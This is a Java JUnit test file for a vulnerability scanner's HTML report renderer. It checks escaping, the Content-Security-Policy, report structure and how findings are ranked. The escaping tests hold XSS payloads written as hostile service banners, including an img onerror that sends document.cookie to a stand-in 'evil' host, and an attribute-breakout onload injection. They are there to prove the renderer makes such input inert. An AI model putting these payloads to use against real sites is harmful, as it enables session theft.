package com.cyberscope.service.report;

import com.cyberscope.model.Coverage;
import com.cyberscope.model.DetectionMethod;
import com.cyberscope.model.ExploitSignal;
import com.cyberscope.model.ExposureBand;
import com.cyberscope.model.Host;
import com.cyberscope.model.HostState;
import com.cyberscope.model.KevStatus;
import com.cyberscope.model.MatchPrecision;
import com.cyberscope.model.Port;
import com.cyberscope.model.PortState;
import com.cyberscope.model.PostureAssessment;
import com.cyberscope.model.Protocol;
import com.cyberscope.model.RankedFinding;
import com.cyberscope.model.ReportProvenance;
import com.cyberscope.model.ScanReport;
import com.cyberscope.model.ScanType;
import com.cyberscope.model.Service;
import com.cyberscope.model.Severity;
import com.cyberscope.model.Vulnerability;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;

import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;
import java.io.StringReader;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertAll;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The report renderer.
 *
 * <h2>How this is tested, and why not with string matching</h2>
 *
 * Asserting on generated markup with {@code contains("<td>")} is a test that
 * fails when someone reformats and passes when someone breaks escaping. So the
 * output is <b>parsed</b> instead, with the JDK's own XML parser, and asserted
 * on with XPath.
 *
 * <p>That buys two things at once. Structure is checked without caring about
 * whitespace, and -- the reason it is worth doing -- <b>a document whose
 * escaping is broken stops parsing</b>. An injected {@code <script>} is not a
 * string this test has to know to look for; it is a structural change the parser
 * reports on its own.
 */
class HtmlReportWriterTest {

    private static final Instant NOW = Instant.parse("2026-09-07T12:00:00Z");
    private static final Instant SCANNED = NOW.minus(Duration.ofHours(3));

    // ------------------------------------------------------------- fixtures

    private static ExploitSignal kev() {
        return new ExploitSignal(0.97, 0.99, KevStatus.LISTED, null, null);
    }

    private static ExploitSignal quiet() {
        return new ExploitSignal(0.002, 0.10, KevStatus.NOT_LISTED, null, null);
    }

    private static Service service(String product, String version, DetectionMethod method) {
        return new Service("http", product, version, "", List.of(), method,
                method == DetectionMethod.PROBED ? 10 : 3);
    }

    private static Port port(int number, Service service) {
        return new Port(number, Protocol.TCP, PortState.OPEN, "syn-ack", service);
    }

    private static Vulnerability vuln(String id, Severity severity, ExploitSignal signal) {
        return new Vulnerability(id, severity, 7.5, "AV:N/AC:L", "3.1", SCANNED,
                "description", MatchPrecision.VERSION_EXACT, "cpe", signal);
    }

    private static ReportProvenance provenance() {
        return new ReportProvenance(NOW,
                new ReportProvenance.Source("NVD corpus", NOW.minus(Duration.ofHours(8)), 384678),
                new ReportProvenance.Source("CISA KEV", NOW.minus(Duration.ofHours(7)), 1694),
                new ReportProvenance.Source("EPSS", NOW.minus(Duration.ofHours(6)), 366252),
                "0.7.0");
    }

    /** A report with two findings and three open services, one of them inferred. */
    private static ScanReport sample(Service webServer) {
        List<RankedFinding> ranked = List.of(
                new RankedFinding(port(443, webServer), "f5:nginx 1.24.0",
                        vuln("CVE-2023-44487", Severity.HIGH, kev())),
                new RankedFinding(port(22, service("OpenSSH", "9.6p1", DetectionMethod.PROBED)),
                        "openbsd:openssh 9.6p1",
                        vuln("CVE-2024-6387", Severity.CRITICAL, quiet())));

        Map<Severity, Integer> bySeverity = new EnumMap<>(Severity.class);
        bySeverity.put(Severity.HIGH, 1);
        bySeverity.put(Severity.CRITICAL, 1);

        PostureAssessment assessment = new PostureAssessment(ExposureBand.HIGH,
                new Coverage(2, 3), 3, 2, 1, bySeverity, ranked);

        Host host = new Host("192.168.1.14", "web-01", HostState.UP, List.of(
                port(443, webServer),
                port(22, service("OpenSSH", "9.6p1", DetectionMethod.PROBED)),
                port(8080, service("", "", DetectionMethod.TABLE))), List.of());

        return new ScanReport("192.168.1.14", 7L, SCANNED, ScanType.QUICK,
                List.of("nmap", "-sV", "-T4", "-oX", "/tmp/scan-1234.xml", "192.168.1.14"),
                assessment, List.of(host), provenance());
    }

    private static ScanReport sample() {
        return sample(service("nginx", "1.24.0", DetectionMethod.PROBED));
    }

    private static String render(ScanReport report) {
        return HtmlReportWriter.render(report, NOW, ZoneOffset.UTC);
    }

    // ------------------------------------------------------------ XML helpers

    /**
     * Parses the output, failing the test if it is not well-formed.
     *
     * <p>External entities are disabled. This parser is being pointed at a
     * document built from attacker-controlled banners, and a security tool that
     * introduces an XXE in its own test harness would be a poor advertisement.
     */
    private static Document parse(String html) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
            factory.setFeature(
                    "http://xml.org/sax/features/external-general-entities", false);
            factory.setFeature(
                    "http://xml.org/sax/features/external-parameter-entities", false);
            factory.setExpandEntityReferences(false);
            DocumentBuilder builder = factory.newDocumentBuilder();
            builder.setEntityResolver((publicId, systemId) ->
                    new InputSource(new StringReader("")));
            return builder.parse(new InputSource(new StringReader(html)));
        } catch (Exception e) {
            throw new AssertionError(
                    "the rendered report is not well-formed XML, which usually means a "
                  + "value was interpolated without escaping: " + e.getMessage(), e);
        }
    }

    private static String xpath(Document document, String expression) {
        try {
            XPath path = XPathFactory.newInstance().newXPath();
            return (String) path.evaluate(expression, document, XPathConstants.STRING);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
    }

    private static int count(Document document, String expression) {
        try {
            XPath path = XPathFactory.newInstance().newXPath();
            NodeList nodes = (NodeList) path.evaluate(expression, document, XPathConstants.NODESET);
            return nodes.getLength();
        } catch (Exception e) {
            throw new AssertionError(e);
        }
    }

    // ----------------------------------------------------------------- tests

    @Test
    @DisplayName("the output is well-formed and self-contained")
    void wellFormedAndSelfContained() {
        String html = render(sample());
        parse(html);            // throws with a useful message if not

        assertAll(
                () -> assertTrue(html.startsWith("<!DOCTYPE html>"), "missing doctype"),
                () -> assertTrue(html.contains("<style>"), "the CSS must be inline"),
                () -> assertFalse(html.contains("<link "),
                        "a report is opened offline and forwarded; it must pull in nothing"),
                () -> assertFalse(html.contains("<script"),
                        "a report has no reason to contain script"));
    }

    @Nested
    @DisplayName("service banners are attacker-controlled input")
    class Escaping {

        /** The shortest payload that works, and one that closes an attribute. */
        private static final String PAYLOAD =
                "<script>alert(1)</script><img src=x onerror=\"fetch('//evil/'+document.cookie)\">";

        @Test
        @DisplayName("a hostile banner cannot inject an element")
        void hostileBannerIsInert() {
            // The host being scanned chooses this string. The person who opens
            // the report is the victim, not the target.
            String html = render(sample(service(PAYLOAD, "1.0", DetectionMethod.PROBED)));
            Document document = parse(html);

            assertAll(
                    () -> assertEquals(0, count(document, "//script"),
                            "a banner became a script element"),
                    () -> assertEquals(0, count(document, "//img"),
                            "a banner became an img element -- <img onerror> is the "
                          + "shortest working payload there is"),
                    () -> assertFalse(html.contains("<script>alert"),
                            "raw payload present in the output"),
                    () -> assertTrue(html.contains("&lt;script&gt;"),
                            "the payload should be visible as text, escaped"));
        }

        @Test
        @DisplayName("the payload is still readable as evidence, not silently dropped")
        void payloadIsShownNotDeleted() {
            String html = render(sample(service(PAYLOAD, "1.0", DetectionMethod.PROBED)));
            Document document = parse(html);
            String evidence = xpath(document, "//table[@id='evidence-table']");

            assertTrue(evidence.contains("alert(1)"),
                    "an analyst needs to SEE that a host sent this. Stripping it would "
                  + "hide an attack from the person investigating one.");
        }

        @Test
        @DisplayName("quotes in a banner cannot break out of an attribute")
        void quotesCannotEscapeAnAttribute() {
            String html = render(sample(
                    service("nginx\" onload=\"alert(1)", "1.0", DetectionMethod.PROBED)));
            Document document = parse(html);
            assertAll(
                    () -> assertEquals(0, count(document, "//*[@onload]")),
                    () -> assertFalse(html.contains("onload=\"alert")));
        }

        @Test
        @DisplayName("ampersands are escaped once, not twice")
        void noDoubleEncoding() {
            String html = render(sample(service("A&B <ok>", "1.0", DetectionMethod.PROBED)));
            assertAll(
                    () -> assertTrue(html.contains("A&amp;B"), "ampersand not escaped"),
                    () -> assertFalse(html.contains("&amp;lt;"),
                            "double-encoded: & was escaped after < was, so the reader "
                          + "sees literal '&lt;' instead of '<'"));
        }

        @Test
        @DisplayName("control bytes in a banner do not produce an unparseable document")
        void controlCharactersAreNeutralised() {
            // A banner is bytes. Nmap will report a version string containing a
            // NUL or a bell, and XML 1.0 forbids them -- a browser would render
            // the document and a strict parser would reject it.
            String html = render(sample(
                    service("nginx [31m", "1.0", DetectionMethod.PROBED)));
            parse(html);
            assertTrue(html.contains("�"),
                    "replaced, not deleted: silently dropping bytes from evidence is "
                  + "not a property a security report should have");
        }

        @Test
        @DisplayName("the document forbids script even if escaping fails")
        void contentSecurityPolicyIsTheSecondControl() {
            String html = render(sample());
            Document document = parse(html);
            String csp = xpath(document,
                    "//meta[@http-equiv='Content-Security-Policy']/@content");

            assertAll(
                    () -> assertTrue(csp.contains("script-src 'none'"), csp),
                    () -> assertTrue(csp.contains("img-src 'none'"),
                            "img-src matters: <img src=x onerror=...> needs no script tag: " + csp),
                    () -> assertTrue(csp.contains("object-src 'none'"), csp));
        }
    }

    @Nested
    @DisplayName("structure a reader depends on")
    class Structure {

        @Test
        @DisplayName("caveats appear before the findings, never after")
        void caveatsComeFirst() {
            // A reader who stops after the first screen must have met the reasons
            // to distrust the numbers.
            String html = render(sample());
            assertTrue(html.indexOf("id=\"caveats\"") < html.indexOf("id=\"findings\""),
                    "caveats at the bottom of a report are decoration");
        }

        @Test
        @DisplayName("the headline states findings and coverage together")
        void headlineCarriesBothNumbers() {
            Document document = parse(render(sample()));
            String headline = xpath(document, "//p[contains(@class,'headline')]");
            assertAll(
                    () -> assertTrue(headline.contains("2 findings"), headline),
                    () -> assertTrue(headline.contains("2 of 3"), headline),
                    () -> assertTrue(headline.contains("67%"), headline));
        }

        @Test
        @DisplayName("every finding is a row, in exploitation order")
        void findingsTableIsComplete() {
            Document document = parse(render(sample()));
            assertAll(
                    () -> assertEquals(2, count(document,
                            "//table[@id='findings-table']/tbody/tr")),
                    // KEV first, although the other finding is CVSS CRITICAL.
                    () -> assertEquals("CVE-2023-44487", xpath(document,
                            "//table[@id='findings-table']/tbody/tr[1]/td[3]")),
                    () -> assertEquals("CVE-2024-6387", xpath(document,
                            "//table[@id='findings-table']/tbody/tr[2]/td[3]")));
        }

        @Test
        @DisplayName("services with no findings still appear in the evidence table")
        void evidenceListsEveryOpenService() {
            // Three open ports, two findings. A findings table alone cannot be
            // checked: the reader cannot tell "nothing filed" from "never looked".
            Document document = parse(render(sample()));
            assertEquals(3, count(document, "//table[@id='evidence-table']/tbody/tr"));
        }

        @Test
        @DisplayName("an inferred service is labelled as never confirmed")
        void inferredServicesAreMarked() {
            Document document = parse(render(sample()));
            String evidence = xpath(document, "//td[@class='ev-table']");
            assertTrue(evidence.contains("inferred from port number"), evidence);
        }

        @Test
        @DisplayName("provenance names all three data sources")
        void provenanceIsRendered() {
            String provenance = xpath(parse(render(sample())), "//section[@id='provenance']");
            assertAll(
                    () -> assertTrue(provenance.contains("384,678"), provenance),
                    () -> assertTrue(provenance.contains("CISA KEV"), provenance),
                    () -> assertTrue(provenance.contains("EPSS"), provenance));
        }

        @Test
        @DisplayName("a missing feed is stated, not omitted")
        void absentFeedsAreNamed() {
            ScanReport report = new ScanReport("10.0.0.1", 1L, SCANNED, ScanType.QUICK,
                    List.of("nmap"), PostureAssessment.empty(), List.of(),
                    ReportProvenance.withoutIndex(NOW, "0.7.0"));

            String provenance = xpath(parse(render(report)), "//section[@id='provenance']");
            assertTrue(provenance.contains("No CVE corpus was loaded"), provenance);
        }

        @Test
        @DisplayName("the authorisation notice is on every report")
        void authorisationIsAlwaysPresent() {
            String notice = xpath(parse(render(sample())), "//section[@id='authorisation']");
            assertTrue(notice.contains("cannot verify"), notice);
        }

        @Test
        @DisplayName("no local filesystem path survives into the document")
        void noLocalPathLeaks() {
            String html = render(sample());
            assertAll(
                    () -> assertFalse(html.contains("/tmp/scan-1234.xml"),
                            "a forwarded report must not carry the operator's paths"),
                    () -> assertFalse(html.contains("-oX")));
        }

        @Test
        @DisplayName("a clean report renders without a caveats block at all")
        void aCleanReportHasNoWarningBox() {
            PostureAssessment clean = new PostureAssessment(ExposureBand.CLEAR,
                    new Coverage(3, 3), 3, 0, 0, Map.of(), List.of());
            ScanReport report = new ScanReport("10.0.0.1", 1L, NOW.minus(Duration.ofMinutes(5)),
                    ScanType.QUICK, List.of("nmap"), clean, List.of(), provenance());

            Document document = parse(render(report));
            assertAll(
                    () -> assertEquals(0, count(document, "//section[@id='caveats']"),
                            "warnings that appear on every report stop being read"),
                    () -> assertTrue(xpath(document, "//p[contains(@class,'headline')]")
                            .contains("nothing found")));
        }
    }

    @Nested
    @DisplayName("the reason a finding is near the top names the right evidence")
    class Reasons {

        private static RankedFinding rank(Severity severity, ExploitSignal signal,
                                          MatchPrecision precision) {
            Vulnerability v = new Vulnerability("CVE-X", severity, 9.8, "AV:N", "3.1",
                    SCANNED, "d", precision, "cpe", signal);
            return new RankedFinding(port(22, service("OpenSSH", "9.6", DetectionMethod.PROBED)),
                    "openbsd:openssh 9.6", v);
        }

        @Test
        @DisplayName("a CVSS-critical finding with EPSS 0.00 does not blame EPSS")
        void cvssPromotionIsAttributedToCvss() {
            // Seen in a real report: "CVE-2026-60002  EPSS 0.00" as the reason it
            // ranked fourth, which reads as "act on this because nobody is
            // exploiting it". It is there because urgency() promotes CVSS
            // CRITICAL to ELEVATED, and the text has to say so.
            String reason = HtmlReportWriter.reason(rank(Severity.CRITICAL,
                    new ExploitSignal(0.001, 0.05, KevStatus.NOT_LISTED, null, null),
                    MatchPrecision.VERSION_EXACT));

            assertAll(
                    () -> assertTrue(reason.contains("CVSS critical"), reason),
                    () -> assertTrue(reason.contains("EPSS only"),
                            "the low score is the qualifier, not the reason: " + reason));
        }

        @Test
        void exploitationBeatsEverything() {
            assertAll(
                    () -> assertEquals("used in ransomware campaigns",
                            HtmlReportWriter.reason(rank(Severity.LOW,
                                    new ExploitSignal(0.9, 0.99, KevStatus.RANSOMWARE, null, null),
                                    MatchPrecision.VERSION_EXACT))),
                    () -> assertEquals("listed in CISA KEV",
                            HtmlReportWriter.reason(rank(Severity.LOW, kev(),
                                    MatchPrecision.VERSION_EXACT))));
        }

        @Test
        @DisplayName("a weak match says it was not ranked on")
        void weakMatchesSaySo() {
            String reason = HtmlReportWriter.reason(rank(Severity.CRITICAL, kev(),
                    MatchPrecision.ALL_VERSIONS));
            assertTrue(reason.contains("not ranked on"), reason);
        }

        @Test
        @DisplayName("no exploitation data is stated, not shown as 0.00")
        void absentEpssIsNotZero() {
            String reason = HtmlReportWriter.reason(rank(Severity.MEDIUM,
                    ExploitSignal.UNKNOWN, MatchPrecision.VERSION_EXACT));
            assertAll(
                    () -> assertEquals("no exploitation data", reason),
                    () -> assertFalse(reason.contains("0.00"),
                            "an unscored CVE is not a CVE scored zero"));
        }
    }

    @Test
    @DisplayName("the print stylesheet keeps a finding on one page")
    void printRulesArePresent() {
        String html = render(sample());
        assertAll(
                () -> assertTrue(html.contains("@media print"),
                        "the whole point of HTML here is Ctrl-P to PDF"),
                () -> assertTrue(html.contains("page-break-inside: avoid"),
                        "a finding split across a page break loses its meaning"),
                () -> assertTrue(html.contains("display: table-header-group"),
                        "headers must repeat on every printed page"));
    }

    @Test
    @DisplayName("rendering is deterministic for the same inputs")
    void sameInputSameOutput() {
        // A report that differs byte-for-byte between runs cannot be diffed
        // against last month's, which is the reason HTML was chosen over PDF.
        assertEquals(render(sample()), render(sample()));
    }
}
